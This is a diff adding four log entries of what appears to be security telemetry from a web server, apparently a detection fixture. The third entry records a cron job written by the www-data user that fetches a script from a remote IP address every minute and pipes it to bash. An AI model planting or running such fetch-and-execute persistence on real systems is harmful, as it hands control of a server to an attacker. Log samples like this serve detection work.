@@ -1,0 +1,4 @@
+{"timestamp": "2026-07-03T10:03:11Z", "host": "web01", "user": "www-data", "Image": "/usr/bin/crontab", "CommandLine": "crontab -e", "ParentImage": "/bin/bash"}
+{"timestamp": "2026-07-03T10:03:15Z", "host": "web01", "user": "www-data", "TargetFilename": "/var/spool/cron/crontabs/www-data", "Action": "write"}
+{"timestamp": "2026-07-03T10:03:16Z", "host": "web01", "user": "www-data", "FileContent": "* * * * * curl -s http://185.220.101.45/update.sh | bash"}
+{"timestamp": "2026-07-03T10:10:00Z", "host": "web01", "user": "raul", "Image": "/usr/bin/crontab", "CommandLine": "crontab -l", "ParentImage": "/bin/bash"}
